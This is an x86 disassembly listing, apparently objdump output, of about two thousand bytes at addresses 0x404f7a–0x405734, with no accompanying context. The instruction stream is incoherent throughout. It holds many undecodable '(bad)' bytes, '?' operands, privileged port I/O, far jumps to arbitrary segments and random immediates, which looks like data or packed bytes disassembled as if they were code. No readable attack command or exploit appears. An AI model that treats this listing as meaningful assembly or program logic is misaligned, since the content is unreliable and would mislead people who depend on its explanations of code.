  404f7a:	stos   DWORD PTR es:[edi],eax
  404f7b:	fisttp DWORD PTR [edx]
  404f7d:	cli    
  404f7e:	push   es
  404f7f:	or     al,BYTE PTR ds:0x9ca2363c
  404f85:	add    al,0x3d
  404f87:	sbb    al,0x9
  404f89:	imul   ebp,DWORD PTR [edi-0x3a928385],0x614c112f
  404f93:	popa   
  404f94:	xchg   ebp,eax
  404f95:	pusha  
  404f96:	int    0xb3
  404f98:	mul    DWORD PTR ds:0x69a6da60
  404f9e:	push   edi
  404f9f:	ret    0x4b4c
  404fa2:	or     eax,edx
  404fa4:	or     eax,0x6da37266
  404fa9:	imul   DWORD PTR [esp+edi*1-0x60]
  404fad:	(bad)  
  404fae:	push   esi
  404faf:	imul   ebx,ebx,0xffffffd5
  404fb2:	(bad)  
  404fb4:	dec    ebx
  404fb5:	xor    eax,0x3fe72cce
  404fba:	les    esp,FWORD PTR [ebx+0x36]
  404fbd:	sbb    BYTE PTR [esi+esi*2],0x77
  404fc1:	int3   
  404fc2:	xchg   ebx,eax
  404fc3:	fs leave 
  404fc5:	dec    BYTE PTR [ebp-0x14]
  404fc8:	or     DWORD PTR [edi+0x9dd24dc],ecx
  404fce:	pop    ebx
  404fcf:	xchg   esi,eax
  404fd0:	dec    eax
  404fd1:	jb     0x404fa6
  404fd3:	addr16 out 0xd7,eax
  404fd6:	push   eax
  404fd7:	push   ds
  404fd8:	jb     0x404f9d
  404fda:	arpl   WORD PTR [esi-0x4f],bp
  404fdd:	jmp    0x9852658d
  404fe2:	sub    esp,DWORD PTR [ebx]
  404fe4:	popf   
  404fe5:	loopne 0x405044
  404fe7:	add    ebx,DWORD PTR [esi+0x455d34f7]
  404fed:	fdivr  DWORD PTR [ebx-0x64ec14bb]
  404ff3:	xchg   esp,eax
  404ff4:	push   edx
  404ff5:	mov    ecx,0xaaea6579
  404ffa:	jg     0x404f80
  404ffc:	xchg   ebx,eax
  404ffd:	jo     0x404f81
  404fff:	jecxz  0x404f83
  405001:	add    DWORD PTR [ebp+0x44b099cd],esp
  405007:	or     BYTE PTR [edi+0x393672c8],0xd9
  40500e:	cmp    BYTE PTR [ebp+0x786a6d95],ch
  405014:	(bad)  
  405015:	mov    ds:0x3769c56d,eax
  40501a:	iret   
  40501b:	inc    ebx
  40501c:	or     eax,0xf5db2f94
  405021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405022:	stos   DWORD PTR es:[edi],eax
  405023:	or     DWORD PTR [esi-0x53b14f62],esi
  405029:	(bad)  
  40502a:	nop
  40502b:	ja     0x4050a5
  40502d:	jo     0x404fd7
  40502f:	sub    BYTE PTR [esi-0x2],0xed
  405033:	cmp    DWORD PTR [ecx+ebx*2-0x1d],0x917159ca
  40503b:	and    esi,DWORD PTR [eax+0x64e23350]
  405041:	int3   
  405042:	cld    
  405043:	ds xor eax,0x9a9a259b
  405049:	dec    ebp
  40504a:	push   ds
  40504b:	sbb    al,0xcf
  40504d:	jg     0x405047
  40504f:	(bad)  
  405050:	(bad)  [esi]
  405052:	inc    esi
  405053:	je     0x4050ca
  405055:	pop    ebp
  405056:	loopne 0x405026
  405058:	xchg   ecx,eax
  405059:	idiv   BYTE PTR [edi-0x1f94c148]
  40505f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405060:	shl    BYTE PTR [esi+eax*4-0x75],1
  405064:	scas   al,BYTE PTR es:[edi]
  405065:	int    0x8c
  405067:	test   BYTE PTR ds:0x54f8a1b5,dl
  40506d:	repnz es test al,0xe5
  405071:	int3   
  405072:	fdivrp st(5),st
  405074:	lahf   
  405075:	sbb    al,0x49
  405077:	add    al,0xb4
  405079:	sti    
  40507a:	lock call 0x57acae32
  405080:	dec    esi
  405081:	outs   dx,DWORD PTR ds:[esi]
  405082:	xor    BYTE PTR ds:0x381b57b,bh
  405088:	dec    esp
  405089:	inc    esp
  40508a:	ins    BYTE PTR es:[edi],dx
  40508b:	mov    eax,ds:0x884df2d9
  405090:	lods   al,BYTE PTR ds:[esi]
  405091:	ficomp DWORD PTR [ebx+0x48df242a]
  405097:	leave  
  405098:	cmp    al,0xf7
  40509a:	sahf   
  40509b:	out    0xd7,eax
  40509d:	leave  
  40509e:	fadd   DWORD PTR ss:0x8e6d74d8
  4050a5:	nop
  4050a6:	jecxz  0x405053
  4050a8:	popf   
  4050a9:	sbb    DWORD PTR ds:0x10284831,ebp
  4050af:	fisubr WORD PTR [eax-0x63]
  4050b2:	out    dx,al
  4050b3:	and    ebp,DWORD PTR [eax]
  4050b5:	fisttp QWORD PTR [ebx]
  4050b7:	iret   
  4050b8:	mov    ecx,DWORD PTR [ebx+ebx*8+0x6b30e2d6]
  4050bf:	jo     0x40504b
  4050c1:	mov    ch,0x77
  4050c3:	mov    ebx,0xa8d83b62
  4050c8:	fs and al,0xad
  4050cb:	stos   DWORD PTR es:[edi],eax
  4050cc:	retf   
  4050cd:	dec    edi
  4050ce:	or     al,0x67
  4050d0:	or     ah,BYTE PTR [edx]
  4050d2:	xchg   BYTE PTR [eax],dh
  4050d4:	rcr    DWORD PTR [edx-0x1d],1
  4050d7:	push   esp
  4050d8:	(bad)  
  4050d9:	pushf  
  4050da:	scas   eax,DWORD PTR es:[edi]
  4050db:	inc    esp
  4050dc:	xor    DWORD PTR [edx],esp
  4050de:	(bad)  
  4050df:	int    0x20
  4050e1:	inc    edx
  4050e2:	inc    eax
  4050e3:	ror    BYTE PTR [edx+0x77],0x3b
  4050e7:	in     al,dx
  4050e8:	ret    0xf35d
  4050eb:	pop    edx
  4050ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050ed:	or     BYTE PTR [ebp+0x1156a1d8],ah
  4050f3:	push   edi
  4050f4:	addr16 in al,0x63
  4050f7:	stos   DWORD PTR es:[edi],eax
  4050f8:	leave  
  4050f9:	outs   dx,DWORD PTR ds:[esi]
  4050fa:	pop    ss
  4050fb:	pop    edi
  4050fc:	adc    DWORD PTR [ebx],ebx
  4050fe:	push   0xf52fdc0a
  405103:	test   al,0x36
  405105:	fs (bad) 
  405107:	adc    esp,DWORD PTR [ebx]
  405109:	ins    DWORD PTR es:[edi],dx
  40510a:	fistp  QWORD PTR [edi]
  40510c:	adc    edx,DWORD PTR [edx-0x2afb7450]
  405112:	shl    DWORD PTR [ebp+ebp*8-0x2ff031fb],0xcd
  40511a:	rcl    cl,0xa
  40511d:	or     al,0x3e
  40511f:	loop   0x405151
  405121:	lods   eax,DWORD PTR ds:[esi]
  405122:	or     BYTE PTR [ebx],al
  405124:	daa    
  405125:	push   ebp
  405126:	sbb    al,0xe2
  405128:	xchg   BYTE PTR [ecx],cl
  40512a:	push   ds
  40512b:	mov    dh,0xda
  40512d:	int3   
  40512e:	stc    
  40512f:	push   ebp
  405130:	mov    cs,WORD PTR [edi+0x46adbd9f]
  405136:	pmaxsw mm7,QWORD PTR [ecx-0x3951b868]
  40513d:	xchg   esp,eax
  40513e:	xchg   esi,eax
  40513f:	sbb    al,0x37
  405141:	mov    ebx,ebx
  405143:	repnz fcom QWORD PTR [ecx]
  405146:	xchg   esi,eax
  405147:	dec    esi
  405148:	fcom   DWORD PTR ds:0xa5fd8bda
  40514e:	inc    esp
  40514f:	cs aam 0x3c
  405152:	cmp    ebx,DWORD PTR [edx+0x6840f644]
  405158:	les    ebx,FWORD PTR [edx+0x4fee21ff]
  40515e:	std    
  40515f:	into   
  405160:	sub    dh,BYTE PTR [eax+eiz*4]
  405163:	mov    WORD PTR [edx+0xcce6dee],ss
  405169:	mov    DWORD PTR [ebp-0x1464a768],edx
  40516f:	jnp    0x405166
  405171:	push   edx
  405172:	aam    0xeb
  405174:	cld    
  405175:	add    ebx,ebx
  405177:	push   ebp
  405178:	int3   
  405179:	add    ebp,DWORD PTR [edi+esi*2]
  40517c:	mov    esp,0xc31eab7e
  405181:	stc    
  405182:	jae    0x405153
  405184:	test   al,0x99
  405186:	data16 addr16 mov dl,0x9a
  40518a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40518b:	xchg   ebx,eax
  40518c:	add    eax,0x293a3e09
  405191:	dec    edi
  405192:	push   cs
  405193:	xor    al,0x35
  405195:	push   ebp
  405196:	jmp    0x405183
  405198:	xor    BYTE PTR [ecx],dh
  40519a:	xlat   BYTE PTR ds:[ebx]
  40519b:	push   ds
  40519c:	mov    cl,0xa4
  40519e:	das    
  40519f:	mov    dl,dl
  4051a1:	loop   0x405193
  4051a3:	cmc    
  4051a4:	bound  esp,QWORD PTR [ecx-0x7fcedc33]
  4051aa:	sub    esp,DWORD PTR [ecx+0x18]
  4051ad:	inc    esi
  4051ae:	mov    ?,WORD PTR [edx]
  4051b0:	retf   0xfb3b
  4051b3:	popf   
  4051b4:	add    al,0x58
  4051b6:	adc    BYTE PTR [ebp+edi*1+0x9ea3630],al
  4051bd:	adc    DWORD PTR [eax],ecx
  4051bf:	lods   al,BYTE PTR ds:[esi]
  4051c0:	xchg   edx,eax
  4051c1:	jo     0x40518f
  4051c3:	repz cmp al,0x39
  4051c6:	(bad)
  4051ca:	(bad)  
  4051cb:	mul    BYTE PTR [edx+0x4]
  4051ce:	(bad)
  4051d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051d2:	mov    WORD PTR [edi+0x1],?
  4051d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051d6:	mov    edi,0x4c3cfff8
  4051db:	stos   DWORD PTR es:[edi],eax
  4051dc:	hlt    
  4051dd:	push   esp
  4051de:	push   0x70
  4051e0:	cmp    dh,BYTE PTR [edx+0x66e3398]
  4051e6:	xchg   ebp,eax
  4051e7:	dec    esp
  4051e8:	es out dx,eax
  4051ea:	push   ecx
  4051eb:	cmp    al,cl
  4051ed:	and    eax,DWORD PTR [edi+0x47738760]
  4051f3:	arpl   WORD PTR [edx-0x8],ax
  4051f6:	xor    DWORD PTR [eax+ebp*1-0x6e674869],ebx
  4051fd:	je     0x40523e
  4051ff:	jle    0x40525f
  405201:	aad    0x41
  405203:	sti    
  405204:	in     eax,0xd9
  405206:	nop
  405207:	jmp    0xccfd:0x405dbcd4
  40520e:	lea    ebx,[ebx-0x2b25eef7]
  405214:	jmp    0xee99:0x3c2ff3d3
  40521b:	add    BYTE PTR [esi-0x69b9f025],bl
  405221:	std    
  405222:	jno    0x4051c4
  405224:	ficomp DWORD PTR [eax+0xc]
  405227:	xchg   esp,eax
  405228:	ins    DWORD PTR es:[edi],dx
  405229:	or     al,0x42
  40522b:	imul   eax,eax,0x193c8f2
  405231:	jmp    0x4051de
  405233:	push   ss
  405234:	or     BYTE PTR [edx],ch
  405236:	sub    BYTE PTR [esi],cl
  405238:	(bad)
  40523b:	loop   0x405214
  40523d:	int3   
  40523e:	push   eax
  40523f:	or     ebp,DWORD PTR [ebx-0x63]
  405242:	inc    edi
  405243:	jle    0x4051d1
  405245:	dec    ebx
  405246:	pop    edi
  405247:	mov    edx,0xb2547fcb
  40524c:	dec    ebx
  40524d:	mov    bl,0xc7
  40524f:	outs   dx,DWORD PTR ds:[esi]
  405250:	xchg   edx,eax
  405251:	pop    ds
  405252:	push   esi
  405253:	mov    DWORD PTR [ebp+0x7],edx
  405256:	imul   esi,DWORD PTR [eax+0x675c7bd5],0x82ef6bd2
  405260:	ss out 0x67,al
  405263:	call   0xfe00:0x7bf355de
  40526a:	pop    ecx
  40526b:	push   edi
  40526c:	jge    0x4051f4
  40526e:	push   edx
  40526f:	pop    edi
  405270:	out    0xe4,al
  405272:	mov    ds:0xe53db38e,al
  405277:	push   esi
  405278:	lea    edx,[ebp+0x65f06ce2]
  40527e:	inc    ebp
  40527f:	or     al,0xec
  405281:	mov    cs,ecx
  405283:	xchg   esp,eax
  405284:	xchg   DWORD PTR [ebp-0x17715a07],esp
  40528a:	inc    ecx
  40528b:	cwde   
  40528c:	sbb    ebp,esp
  40528e:	call   0x7fd3:0xe3e33dbf
  405295:	jo     0x40530b
  405297:	dec    edx
  405298:	pushf  
  405299:	addr16 std 
  40529b:	mov    ecx,0x7d02280a
  4052a0:	cdq    
  4052a1:	inc    eax
  4052a2:	push   ds
  4052a3:	into   
  4052a4:	lock or al,0xb6
  4052a7:	xchg   edi,eax
  4052a8:	mov    DWORD PTR [ebx],0x4afd637f
  4052ae:	inc    esp
  4052af:	or     DWORD PTR [ebx*2+0x362286b],0xd260d46b
  4052ba:	sbb    BYTE PTR [edx],bl
  4052bc:	sub    al,0xfd
  4052be:	ja     0x405282
  4052c0:	dec    edx
  4052c1:	fiadd  WORD PTR [edi-0x482eed48]
  4052c7:	push   cs
  4052c8:	(bad)  
  4052c9:	repz sbb al,0x26
  4052cc:	pop    edi
  4052cd:	jo     0x40531e
  4052cf:	sahf   
  4052d0:	fisub  WORD PTR cs:[eax]
  4052d3:	call   0x5a0a:0x7a943a95
  4052da:	xchg   edx,eax
  4052db:	sbb    al,0x89
  4052dd:	xor    BYTE PTR [ebx-0x248dd026],ch
  4052e3:	adc    cl,BYTE PTR [edi-0x7f7f3540]
  4052e9:	ins    BYTE PTR es:[edi],dx
  4052ea:	push   0xffffffc8
  4052ec:	push   esp
  4052ed:	xor    al,0xe8
  4052ef:	das    
  4052f0:	add    DWORD PTR [esi],edi
  4052f2:	inc    edi
  4052f3:	cmp    BYTE PTR [eax-0x7c3fb638],al
  4052f9:	pop    ss
  4052fa:	enter  0x117d,0x1d
  4052fe:	or     al,bh
  405300:	sub    BYTE PTR ds:0x7fad8981,al
  405306:	shr    DWORD PTR ds:0x944c9742,cl
  40530c:	push   ebx
  40530d:	dec    ebp
  40530e:	inc    ecx
  40530f:	jle    0x40533b
  405311:	push   ebp
  405312:	mov    ebp,0xe00f77fa
  405317:	jbe    0x40529f
  405319:	mov    dh,0xfd
  40531b:	pop    edx
  40531c:	jle    0x405357
  40531e:	jge    0x405352
  405320:	loopne 0x405395
  405322:	out    0x79,eax
  405324:	mov    edi,0x6ad3afe6
  405329:	and    eax,0x8f1e72f6
  40532e:	retf   
  40532f:	addr16 push eax
  405331:	cmp    BYTE PTR [esi+esi*4],0x91
  405335:	push   cs
  405336:	setg   BYTE PTR [esi+0x7a]
  40533a:	dec    esp
  40533b:	mov    ecx,DWORD PTR [ecx]
  40533d:	cld    
  40533e:	xchg   ecx,eax
  40533f:	aas    
  405340:	pusha  
  405341:	jecxz  0x4052d7
  405343:	fs aad 0xb5
  405346:	loopne 0x40535b
  405348:	xchg   BYTE PTR [esi],al
  40534a:	scas   al,BYTE PTR es:[edi]
  40534b:	mov    edx,0x1174434
  405350:	xor    DWORD PTR [ebx],esp
  405352:	clc    
  405353:	data16 jbe 0x4052ed
  405356:	dec    ebx
  405357:	adc    eax,edi
  405359:	retf   
  40535a:	out    dx,eax
  40535b:	into   
  40535c:	jmp    0x74:0x5c895dd0
  405363:	xchg   DWORD PTR [esi+ecx*8],eax
  405366:	popf   
  405367:	pusha  
  405368:	rcr    BYTE PTR [eax+0x2f48d3ea],1
  40536e:	data16 in al,0xd
  405371:	cs test al,0x6e
  405374:	mov    ds:0x1eed1016,al
  405379:	or     eax,0x9d37338d
  40537e:	xor    dh,BYTE PTR [edx-0x1061ef5f]
  405384:	push   ebp
  405385:	jmp    0xddde:0xc549b16d
  40538c:	push   esi
  40538d:	popa   
  40538e:	xlat   BYTE PTR ds:[ebx]
  40538f:	sbb    eax,0x313e89bd
  405394:	and    al,0x55
  405396:	fwait
  405397:	xor    ah,BYTE PTR [ebp+0x5c112593]
  40539d:	(bad)  
  40539e:	mov    ebx,0x5c6ba2a2
  4053a3:	or     al,0x1d
  4053a5:	sbb    DWORD PTR ds:0x5c505cdb,edx
  4053ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ac:	add    ah,bh
  4053ae:	shl    BYTE PTR es:0x9db15778,0xe5
  4053b6:	inc    ebp
  4053b7:	(bad)  
  4053b8:	and    BYTE PTR [eax],bl
  4053ba:	push   ds
  4053bb:	out    0x43,al
  4053bd:	sub    eax,0xc697dd4f
  4053c2:	mov    bh,0x4
  4053c4:	cmp    BYTE PTR [esi],cl
  4053c6:	inc    ecx
  4053c7:	adc    esp,DWORD PTR [ebp-0x66]
  4053ca:	out    dx,al
  4053cb:	push   edx
  4053cc:	dec    ebx
  4053cd:	es mov ecx,0xbbbedc04
  4053d3:	mov    al,0xa9
  4053d5:	jae    0x4053d2
  4053d7:	cmp    DWORD PTR [ebp+esi*8+0x5cf60e38],esi
  4053de:	data16 fwait
  4053e0:	dec    ecx
  4053e1:	adc    edi,DWORD PTR [ecx+esi*1-0x67]
  4053e5:	dec    eax
  4053e6:	das    
  4053e7:	xor    ch,dl
  4053e9:	push   esp
  4053ea:	rol    DWORD PTR [ecx+0x779b6ad7],0x4f
  4053f1:	adc    eax,ebx
  4053f3:	jno    0x405459
  4053f5:	jecxz  0x405463
  4053f7:	jnp    0x4053e8
  4053f9:	mov    esi,0x26fd8d6c
  4053fe:	rol    BYTE PTR [esi+eiz*4+0x31],cl
  405402:	lea    eax,[esi-0x49]
  405405:	pop    eax
  405406:	xchg   esi,eax
  405407:	nop
  405408:	xor    edi,edx
  40540a:	fadd   st,st(6)
  40540c:	enter  0x6c97,0x1d
  405410:	in     al,dx
  405411:	pop    esp
  405412:	pop    ss
  405413:	add    dl,BYTE PTR [ecx+0x1ef39338]
  405419:	mov    ebx,0x545dd607
  40541e:	movd   mm2,DWORD PTR [ecx]
  405421:	sub    BYTE PTR [eax],0x2e
  405424:	fld    DWORD PTR [esi+0x7063f010]
  40542a:	test   DWORD PTR [edx-0x26bcae5e],edi
  405430:	test   DWORD PTR [edi+0x3e],eax
  405433:	bound  edx,QWORD PTR [ebp+0x217851d1]
  405439:	std    
  40543a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40543b:	rcl    BYTE PTR ds:0x72146ad2,0x8
  405442:	lahf   
  405443:	xor    DWORD PTR [edi+0x30],eax
  405446:	mov    bh,0x94
  405448:	cwde   
  405449:	push   ecx
  40544a:	cmp    ecx,DWORD PTR [edi+0x69450928]
  405450:	std    
  405451:	dec    ecx
  405452:	mov    ds:0xc368de27,al
  405457:	sar    ebx,1
  405459:	dec    DWORD PTR [edi-0x51a278a6]
  40545f:	outs   dx,BYTE PTR ds:[esi]
  405460:	sbb    dl,BYTE PTR [ecx+0x5c]
  405463:	xchg   edx,eax
  405464:	inc    edx
  405465:	and    DWORD PTR [esi-0x4692a7c9],edi
  40546b:	cdq    
  40546c:	cmc    
  40546d:	xor    BYTE PTR [eax],cl
  40546f:	pop    ecx
  405470:	in     eax,0x73
  405472:	xor    eax,0xd492ca86
  405477:	mov    eax,ds:0x1ffac5b9
  40547c:	push   0xc
  40547e:	adc    BYTE PTR [ecx+edi*4+0x3e4aa046],bh
  405485:	loopne 0x4054da
  405487:	pop    eax
  405488:	cli    
  405489:	dec    ebx
  40548a:	dec    edi
  40548b:	pop    eax
  40548c:	xlat   BYTE PTR ds:[ebx]
  40548d:	cs aaa 
  40548f:	loop   0x405474
  405491:	shl    DWORD PTR [ecx-0x1ecee13d],1
  405497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405498:	dec    edx
  405499:	aad    0x8a
  40549b:	mov    edx,0xb22d2304
  4054a0:	mov    ebx,0xab2fb3f3
  4054a5:	dec    eax
  4054a6:	sub    al,0x81
  4054a8:	stos   BYTE PTR es:[edi],al
  4054a9:	jb     0x4054dd
  4054ab:	xchg   al,bl
  4054ad:	jmp    0x34a2af68
  4054b2:	std    
  4054b3:	sub    al,0xa0
  4054b5:	ins    DWORD PTR es:[edi],dx
  4054b6:	scas   al,BYTE PTR es:[edi]
  4054b7:	mov    dh,0x65
  4054b9:	pop    ebp
  4054ba:	sbb    eax,0x9880aa86
  4054bf:	enter  0xebf0,0x72
  4054c3:	xchg   DWORD PTR [edi],edx
  4054c5:	mov    ah,0x45
  4054c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c8:	mov    DWORD PTR [eax-0x38],edi
  4054cb:	je     0x40550b
  4054cd:	fnstcw WORD PTR [ebp-0x13]
  4054d0:	xor    al,0xbd
  4054d2:	inc    ah
  4054d4:	ror    eax,cl
  4054d6:	fwait
  4054d7:	mov    cl,0xb7
  4054d9:	mov    dl,BYTE PTR [esi]
  4054db:	loope  0x40552e
  4054dd:	hlt    
  4054de:	fimul  WORD PTR [ecx+0x1b]
  4054e1:	push   ebx
  4054e2:	test   al,0xd9
  4054e4:	arpl   WORD PTR [ebp+0x6feaa7d],sp
  4054ea:	not    BYTE PTR [ebp-0x3ee09bca]
  4054f0:	in     al,dx
  4054f1:	cmp    WORD PTR [ebx+0x1d],bp
  4054f5:	rcr    ch,1
  4054f7:	div    DWORD PTR [eax]
  4054f9:	lods   eax,DWORD PTR ds:[esi]
  4054fa:	lahf   
  4054fb:	lods   al,BYTE PTR ds:[esi]
  4054fc:	jp     0x405485
  4054fe:	adc    BYTE PTR [eax-0x52],dh
  405501:	in     eax,0x8
  405503:	mov    al,0x76
  405505:	(bad)  
  405506:	xchg   ebx,eax
  405507:	test   DWORD PTR [ebx+0x4986f09f],ecx
  40550d:	ds imul ecx,ebx,0x22664911
  405514:	mov    edx,0xb6a7ef21
  405519:	repz jb 0x40550c
  40551c:	nop
  40551d:	shl    BYTE PTR [ecx-0x21],1
  405520:	addr16 pop ss
  405522:	outs   dx,DWORD PTR ds:[esi]
  405523:	mov    ecx,0x2a97e41c
  405528:	push   esi
  405529:	not    DWORD PTR [esi-0x37]
  40552c:	icebp  
  40552d:	jnp    0x4054b2
  40552f:	mov    ds:0xeb372675,al
  405534:	mov    bh,0x2b
  405536:	(bad)  
  405537:	outs   dx,DWORD PTR ds:[esi]
  405538:	jmp    0x405566
  40553a:	lea    ebp,[ebx]
  40553c:	aas    
  40553d:	js     0x40552f
  40553f:	ret    
  405540:	mov    ecx,0x63eb68d6
  405545:	jmp    0x3426:0x71e4daa5
  40554c:	dec    edi
  40554d:	or     DWORD PTR [ecx-0x46],0xfffffffa
  405551:	mov    dl,0xcc
  405553:	push   ebx
  405554:	mov    ah,0xfb
  405556:	pusha  
  405557:	(bad)  [edi-0x56]
  40555a:	icebp  
  40555b:	mov    al,0xca
  40555d:	add    al,0x8f
  40555f:	pushf  
  405560:	mov    cl,0xd
  405562:	or     BYTE PTR [eax+0xd],dh
  405565:	adc    bl,ah
  405567:	xor    eax,0x5e2942f0
  40556c:	enter  0x4aed,0x7a
  405570:	xor    al,0xe6
  405572:	(bad)  
  405573:	dec    edi
  405574:	addr16 pop esi
  405576:	xchg   edi,eax
  405577:	mov    esi,?
  405579:	jno    0x4054fd
  40557b:	adc    eax,0x4d9e3669
  405580:	lock push edx
  405582:	ins    DWORD PTR es:[edi],dx
  405583:	inc    esi
  405584:	sub    al,0x98
  405586:	stos   BYTE PTR es:[edi],al
  405587:	int    0x61
  405589:	xchg   ebp,eax
  40558a:	adc    eax,0x1bb36151
  40558f:	push   0xffffffeb
  405591:	js     0x405520
  405593:	stc    
  405594:	push   ss
  405595:	adc    al,0x88
  405597:	jns    0x4055dc
  405599:	xchg   DWORD PTR [eax-0x73],ecx
  40559c:	xor    bl,ah
  40559e:	or     edx,esi
  4055a0:	sub    cl,al
  4055a2:	or     edx,DWORD PTR [ecx+0xc]
  4055a5:	lods   eax,DWORD PTR ds:[esi]
  4055a6:	test   DWORD PTR [edx],eax
  4055a8:	xchg   ecx,eax
  4055a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055aa:	jno    0x405533
  4055ac:	mov    ch,0x4f
  4055ae:	fstp   DWORD PTR [edi+0x20]
  4055b1:	(bad)  [esi]
  4055b3:	inc    edx
  4055b4:	mov    bh,0x48
  4055b6:	aam    0x7
  4055b8:	add    edi,DWORD PTR [ebx+0x7ac37e5]
  4055be:	(bad)  
  4055c0:	lds    esp,FWORD PTR [esp+esi*4-0x37]
  4055c4:	inc    edi
  4055c5:	repnz sbb edi,eax
  4055c8:	les    edi,FWORD PTR [edi+eax*4-0x20]
  4055cc:	mov    ds,ebp
  4055ce:	ja     0x4055c6
  4055d0:	jp     0x405646
  4055d2:	sub    al,0x2e
  4055d4:	sbb    al,0x4b
  4055d6:	mov    BYTE PTR [edx],dl
  4055d8:	adc    DWORD PTR [ecx-0x70773046],0x9964c829
  4055e2:	test   al,0x3a
  4055e4:	dec    ebx
  4055e5:	dec    ebx
  4055e6:	xor    al,0xbb
  4055e8:	cmp    BYTE PTR [ebp-0x4],dl
  4055eb:	xor    dl,BYTE PTR [ebx]
  4055ed:	xor    ah,BYTE PTR [edx-0x18]
  4055f0:	sbb    eax,0x3770f29b
  4055f5:	sbb    al,BYTE PTR [esp+ebp*1-0x22]
  4055f9:	hlt    
  4055fa:	xor    eax,0x35e65c9c
  4055ff:	mov    ds,WORD PTR [edi+0x77]
  405602:	and    eax,DWORD PTR [ecx]
  405604:	sbb    eax,0xf81a024f
  405609:	adc    edx,edx
  40560b:	je     0x405685
  40560d:	imul   edx,edx,0x73e874fc
  405613:	jno    0x4055c8
  405615:	fild   QWORD PTR [edx-0x368cc76e]
  40561c:	mov    edx,0x37abc43c
  405621:	cs fwait
  405623:	shl    cl,cl
  405625:	cmp    al,0x21
  405627:	mul    DWORD PTR [edx+ebp*4-0x7fd2524e]
  40562e:	stos   DWORD PTR es:[edi],eax
  40562f:	or     ch,BYTE PTR [edi+ecx*4-0x7ac210d]
  405636:	cmp    eax,0x91d894af
  40563b:	xchg   edi,eax
  40563c:	push   esi
  40563d:	das    
  40563e:	es jne 0x40567e
  405641:	dec    ecx
  405642:	in     al,0x64
  405644:	das    
  405645:	push   edx
  405646:	pop    ecx
  405647:	(bad)  
  405648:	xor    al,0xea
  40564a:	daa    
  40564b:	and    BYTE PTR [ebp+0x275cad77],dl
  405651:	push   edx
  405652:	sub    BYTE PTR [edx-0x5527734f],0x50
  405659:	push   edx
  40565a:	js     0x405683
  40565c:	push   eax
  40565d:	retf   
  40565e:	push   esp
  40565f:	inc    esi
  405660:	dec    ebp
  405661:	stos   BYTE PTR es:[edi],al
  405662:	scas   al,BYTE PTR es:[edi]
  405663:	cmp    esp,ebx
  405665:	dec    esp
  405666:	fadd   QWORD PTR [eax]
  405668:	jb     0x4056e8
  40566a:	mov    bl,0x38
  40566c:	(bad)  
  40566d:	icebp  
  40566e:	(bad)  
  40566f:	aad    0x2e
  405671:	out    dx,al
  405672:	xchg   esi,eax
  405673:	lahf   
  405674:	xor    al,0xac
  405676:	(bad)  
  405677:	lods   eax,DWORD PTR ds:[esi]
  405678:	add    esp,DWORD PTR fs:[edx+0x5]
  40567c:	jmp    0x4056c6
  40567e:	popf   
  40567f:	sti    
  405680:	in     eax,dx
  405681:	jecxz  0x405639
  405683:	dec    ebp
  405684:	ds mov edx,0x75b6370
  40568a:	loop   0x4056e2
  40568c:	je     0x405699
  40568e:	pop    ebp
  40568f:	scas   eax,DWORD PTR es:[edi]
  405690:	dec    edx
  405691:	mov    edi,DWORD PTR [esp+eax*1+0x46]
  405695:	fnstenv [ecx]
  405697:	jge    0x4056cb
  405699:	ret    0x23fb
  40569c:	(bad)  
  40569d:	ins    BYTE PTR es:[edi],dx
  40569e:	pop    DWORD PTR [ebx+0x16]
  4056a1:	test   eax,esi
  4056a3:	pop    ds
  4056a4:	adc    eax,0xa31362c0
  4056a9:	or     al,cl
  4056ab:	icebp  
  4056ac:	cmc    
  4056ad:	inc    eax
  4056ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056af:	leave  
  4056b0:	sbb    al,0x8f
  4056b2:	out    dx,al
  4056b3:	pop    ss
  4056b4:	int3   
  4056b5:	fsubr  DWORD PTR [ebp+0x38]
  4056b8:	push   es
  4056b9:	cmp    DWORD PTR [eax+eiz*1+0x3b3a850b],esi
  4056c0:	xchg   esp,eax
  4056c1:	(bad)  
  4056c2:	iret   
  4056c3:	xchg   DWORD PTR [eax+ebx*8+0x1bd634cc],ebp
  4056ca:	js     0x405683
  4056cc:	inc    edi
  4056cd:	stos   DWORD PTR es:[edi],eax
  4056ce:	xor    eax,0xafa34aa5
  4056d3:	mov    cs,WORD PTR [eax+0x8eb7538]
  4056d9:	das    
  4056da:	dec    eax
  4056db:	(bad)  
  4056dc:	jecxz  0x405732
  4056de:	das    
  4056df:	jl     0x4056ef
  4056e1:	pop    edi
  4056e2:	xor    DWORD PTR [esi+0x25],esp
  4056e5:	pop    ebp
  4056e6:	and    BYTE PTR ds:0xc215f752,0xe5
  4056ed:	(bad)  
  4056ee:	adc    esp,DWORD PTR [ebx-0x42]
  4056f1:	dec    ebx
  4056f2:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056f4:	out    0xc0,al
  4056f6:	sbb    bl,bl
  4056f8:	in     al,0xc9
  4056fa:	imul   ebp,DWORD PTR [edx],0xd6eb321b
  405700:	sub    ch,bh
  405702:	sbb    esp,ecx
  405704:	aam    0x1e
  405706:	dec    ebp
  405707:	loop   0x405710
  405709:	jns    0x4056d9
  40570b:	ins    BYTE PTR es:[edi],dx
  40570c:	enter  0xfa60,0xdc
  405710:	xchg   esp,eax
  405711:	ds ins BYTE PTR es:[edi],dx
  405713:	cmp    al,0xf4
  405715:	imul   ebp,DWORD PTR [edx+0x56],0xa2edf9b5
  40571c:	pop    esp
  40571d:	nop
  40571e:	xor    ebx,DWORD PTR [ebx-0x68]
  405721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405722:	scas   al,BYTE PTR es:[edi]
  405723:	fs retf 
  405725:	adc    eax,0x431f5725
  40572a:	cmc    
  40572b:	jns    0x4057a1
  40572d:	mov    BYTE PTR [ecx+0x192ea64b],0x61
  405734:	jl     0x405729
